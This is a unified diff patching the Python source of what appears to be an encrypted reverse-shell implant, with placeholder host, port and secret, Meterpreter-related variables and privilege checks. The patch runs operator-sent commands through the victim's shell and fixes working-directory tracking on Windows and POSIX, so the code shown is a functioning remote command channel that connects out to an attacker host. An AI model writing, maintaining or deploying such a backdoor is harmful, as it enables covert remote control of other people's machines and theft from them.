@@ -127,8 +127,11 @@ def fbypass(cmd):
 		return back
 
 def fsubprocess(cmd):
+	if ushell:
+		cmd = "%s -c '%s'" % (ushell, cmd)
 	out = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 	return out.stdout.read() + out.stderr.read()
+
 
 host, port, secret = '***HOST***', ***PORT***, '***SECRET***'
 
@@ -142,7 +145,7 @@ iv = Random.new().read(AES.block_size)
 cipher = AES.new(secret,AES.MODE_CFB, iv)
 MeterBin, DropSock, is64 = None, None, False
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-isAdmin, isSystem, is64 = False, False, False
+isAdmin, isSystem, is64, isWindows, ushell = False, False, False, False, False
 opsys = platform.uname()[0] + ' ' + platform.uname()[2]
 paddedopsys = opsys + '*' * (64 - len(opsys))
 starpadding = '*' * 16
@@ -169,6 +172,7 @@ if os.name == 'nt':
 	###################################################################################################
 
 	pwdvar = 'cd'
+	isWindows = True
 	pwd = fsubprocess(pwdvar).strip('**n').strip('**r')
 	paddedpwd = pwd.strip('**r') + '*' * (64 - len(pwd.strip('**r')))
 	adm = fsubprocess('whoami').strip('**n').strip('**r')
@@ -229,6 +233,7 @@ elif os.name == 'posix':
 	if os.getuid() == 0:
 		isSystem = True
 	pwdvar = 'pwd'
+	ushell = os.popen('echo $SHELL').read().strip()
 	pwd = fsubprocess(pwdvar).strip('**n')
 	paddedpwd = pwd + '*' * (64 - len(pwd))
 	if isSystem:
@@ -443,11 +448,16 @@ while 1:
 	else:
 		cmd = 'cd %s&&%s&&%s' % (pwd, decrypted, pwdvar)												## This is how we maintain pwd
 		stdout = fsubprocess(cmd)
-		if 'is not recognized as an internal' not in stdout and ': not found' not in stdout:
+		if 'is not recognized as an internal' not in stdout and ': command not found' not in stdout and 'No such file or directory' not in stdout:
 			checkpath = stdout.split('**n')[-2].strip('**n').strip('**r')
 			if '[X]' not in checkpath and '[*]' not in checkpath:
 				if checkpath:
-					pwd = checkpath
+					if isWindows:
+						if '\\\\' in checkpath.strip('**r'):
+							pwd = checkpath
+					else:
+						if checkpath.find(':') == -1:
+							pwd = checkpath
 
 		result = '**n'.join(stdout.split('**n')[:-1]) + '**nEOFEOFEOFEOFEOFX'
 		encrypted = EncodeAES(cipher, result)
@@ -650,11 +660,17 @@ while True:
 		pass
 
 	if decrypted.endswith("EOFEOFEOFEOFEOFX"):					## Data ending in this code indicates we should print the data
-		if 'is not recognized as an internal' not in decrypted and ': not found' not in decrypted:
+		if 'is not recognized as an internal' not in decrypted and ': command not found' not in decrypted:
 			checkpath = decrypted.split('**n')[-2].strip('**n').strip('**r')
 			if '[X]' not in checkpath and '[*]' not in checkpath:
-				pwd = checkpath.strip('**r')
-				newpwd = True
+				if isWindows:
+					if '\\\\' in checkpath.strip('**r'):
+						pwd = checkpath.strip('**r')
+						newpwd = True
+				else:
+					if ':' not in checkpath:
+						pwd = checkpath.strip('**r')
+						newpwd = True
 		if newpwd:
 			print '**n'.join(decrypted.split('**n')[:-2]) + '**n'
 		else:
